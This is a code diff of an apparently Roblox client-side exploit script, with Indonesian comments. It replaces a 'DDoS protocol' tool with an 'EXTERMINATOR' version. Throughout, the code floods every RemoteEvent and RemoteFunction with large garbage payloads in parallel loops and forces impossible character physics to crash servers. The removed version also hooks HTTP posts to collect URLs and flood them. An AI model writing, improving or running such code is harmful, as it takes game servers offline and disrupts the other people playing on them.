@@ -1,139 +1,100 @@
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- Cleanup
-if CoreGui:FindFirstChild("IkyyDDoS_V15") then CoreGui:FindFirstChild("IkyyDDoS_V15"):Destroy() end
+-- UI CLEANUP
+if CoreGui:FindFirstChild("Ikyy_EXTERMINATOR") then CoreGui:FindFirstChild("Ikyy_EXTERMINATOR"):Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "IkyyDDoS_V15"
+ScreenGui.Name = "Ikyy_EXTERMINATOR"
 ScreenGui.Parent = CoreGui
 
--- UI Helpers
-local function AddCorner(p, r) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, r) c.Parent = p end
-local function MakeDraggable(f)
-    local d, di, ds, sp
-    f.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = f.Position end end)
-    f.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
-    UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
-    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = false end end)
-end
-
--- Main Frame
+-- UI DESIGN (AGGRESSIVE RED)
 local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 260, 0, 180)
-Main.Position = UDim2.new(0.5, -130, 0.5, -90)
-Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Main.Size = UDim2.new(0, 240, 0, 160)
+Main.Position = UDim2.new(0.5, -120, 0.5, -80)
+Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
 Main.Parent = ScreenGui
-AddCorner(Main, 20)
-MakeDraggable(Main)
-
-local Stroke = Instance.new("UIStroke")
-Stroke.Thickness = 3
-Stroke.Color = Color3.fromRGB(255, 0, 0)
-Stroke.Parent = Main
+local Corner = Instance.new("UICorner") Corner.CornerRadius = UDim.new(0, 10) Corner.Parent = Main
+local Stroke = Instance.new("UIStroke") Stroke.Thickness = 3 Stroke.Color = Color3.fromRGB(255, 0, 0) Stroke.Parent = Main
 
 local Title = Instance.new("TextLabel")
-Title.Text = "IKYY DDOS PROTOCOL"
-Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Text = "TERMINATE PROTOCOL V17"
+Title.Size = UDim2.new(1, 0, 0, 40)
 Title.TextColor3 = Color3.fromRGB(255, 0, 0)
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 16
+Title.TextSize = 14
 Title.BackgroundTransparency = 1
 Title.Parent = Main
 
--- DDoS Switch Component
-local SwitchBtn = Instance.new("TextButton")
-SwitchBtn.Size = UDim2.new(0, 180, 0, 50)
-SwitchBtn.Position = UDim2.new(0.5, -90, 0.5, -10)
-SwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-SwitchBtn.Text = "SYSTEM IDLE"
-SwitchBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
-SwitchBtn.Font = Enum.Font.GothamBold
-SwitchBtn.TextSize = 14
-SwitchBtn.Parent = Main
-AddCorner(SwitchBtn, 25)
+local BrutalBtn = Instance.new("TextButton")
+BrutalBtn.Size = UDim2.new(0, 200, 0, 60)
+BrutalBtn.Position = UDim2.new(0.5, -100, 0.5, -10)
+BrutalBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+BrutalBtn.Text = "ENGAGE BRUTAL MODE"
+BrutalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+BrutalBtn.Font = Enum.Font.GothamBold
+BrutalBtn.TextSize = 13
+BrutalBtn.Parent = Main
+local BCorner = Instance.new("UICorner") BCorner.CornerRadius = UDim.new(0, 8) BCorner.Parent = BrutalBtn
 
-local Status = Instance.new("TextLabel")
-Status.Text = "Status: Waiting for Activation"
-Status.Size = UDim2.new(1, 0, 0, 30)
-Status.Position = UDim2.new(0, 0, 1, -35)
-Status.TextColor3 = Color3.fromRGB(100, 100, 100)
-Status.Font = Enum.Font.Code
-Status.TextSize = 10
-Status.BackgroundTransparency = 1
-Status.Parent = Main
+-- LOGIKA BRUTAL (THE EXTERMINATOR)
+local Active = false
+local Garbage = string.rep("\255", 20000) -- Karakter biner berat (Memory Stress)
+local TableHell = {}
+for i = 1, 500 do table.insert(TableHell, {["Crash"] = Garbage, ["ID"] = math.random()}) end
 
--- DDOS LOGIC VARIABLES
-local Attacking = false
-local HugePayload = string.rep("0", 5000) -- Data sampah berukuran besar
-local TargetURLs = {} -- Menampung URL hasil sniffer otomatis
-
--- INTERCEPTOR: Otomatis mencari URL Target
-local old; old = hookfunction(HttpService.PostAsync, function(self, url, ...)
-    if not table.find(TargetURLs, url) then table.insert(TargetURLs, url) end
-    return old(self, url, ...)
-end)
-
--- CORE DDOS ENGINE
-local function ExecuteDDoS()
-    while Attacking do
-        -- Task Spawn membuat serangan berjalan di banyak 'thread' sekaligus (Flood)
-        task.spawn(function()
-            -- 1. REMOTE PACKET FLOOD
-            for _, v in pairs(game:GetDescendants()) do
-                if v:IsA("RemoteEvent") then
-                    pcall(function()
-                        v:FireServer(HugePayload) -- Membanjiri server dengan data besar
-                    end)
-                elseif v:IsA("RemoteFunction") then
-                    task.spawn(function() pcall(function() v:InvokeServer(HugePayload) end) end)
+local function KillServer()
+    while Active do
+        -- STEP 1: PARALLEL REMOTE BOMBARDMENT
+        for i = 1, 50 do -- 50 Kali lipat per loop (Brutal)
+            task.spawn(function()
+                for _, r in pairs(game:GetDescendants()) do
+                    if not Active then break end
+                    if r:IsA("RemoteEvent") then
+                        -- Mengirim 3 Argumen Berat Sekaligus
+                        r:FireServer(TableHell, Garbage, Vector3.new(math.huge, math.huge, math.huge))
+                    elseif r:IsA("RemoteFunction") then
+                        -- RemoteFunction dikirim tanpa menunggu (Async)
+                        task.spawn(function() pcall(function() r:InvokeServer(TableHell) end) end)
+                    end
                 end
-            end
-
-            -- 2. HTTPS REQUEST FLOOD
-            for _, url in pairs(TargetURLs) do
-                pcall(function()
-                    HttpService:PostAsync(url, HttpService:JSONEncode({["ddos"] = HugePayload}))
-                end)
-            end
-        end)
-        task.wait(0.01) -- Delay sangat rendah untuk CPU Stressing
+            end)
+        end
+        
+        -- STEP 2: PHYSICS ENGINE STRESS (CLIENT-TO-SERVER REPLICATION)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            pcall(function()
+                -- Memaksa server menghitung posisi mustahil secara konstan
+                LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1e32, 1e32, 1e32)
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
+            end)
+        end
+        
+        task.wait() -- Tanpa angka di wait() = Secepat refresh rate (BRUTAL)
     end
 end
 
--- SWITCH TOGGLE
-SwitchBtn.MouseButton1Click:Connect(function()
-    Attacking = not Attacking
-    if Attacking then
-        -- Visual ON
-        SwitchBtn.Text = "ATTACKING..."
-        SwitchBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-        SwitchBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-        Status.Text = "Status: FLOODING PACKETS"
-        Status.TextColor3 = Color3.fromRGB(255, 50, 50)
-        Stroke.Color = Color3.fromRGB(255, 255, 255)
-        
-        task.spawn(ExecuteDDoS)
+BrutalBtn.MouseButton1Click:Connect(function()
+    Active = not Active
+    if Active then
+        BrutalBtn.Text = "TERMINATING..."
+        BrutalBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        BrutalBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+        task.spawn(KillServer)
     else
-        -- Visual OFF
-        SwitchBtn.Text = "SYSTEM IDLE"
-        SwitchBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
-        SwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-        Status.Text = "Status: Attack Aborted"
-        Status.TextColor3 = Color3.fromRGB(100, 100, 100)
-        Stroke.Color = Color3.fromRGB(255, 0, 0)
+        BrutalBtn.Text = "ENGAGE BRUTAL MODE"
+        BrutalBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+        BrutalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     end
 end)
 
--- Rainbow Pulse for Title
-RunService.RenderStepped:Connect(function()
-    if Attacking then
-        Title.TextColor3 = Color3.fromHSV(tick() % 1, 1, 1)
-    end
-end)
+-- DRAG LOGIC
+local d; local di; local ds; local sp
+Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = Main.Position end end)
+Main.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
+UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds Main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
+UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = false end end)
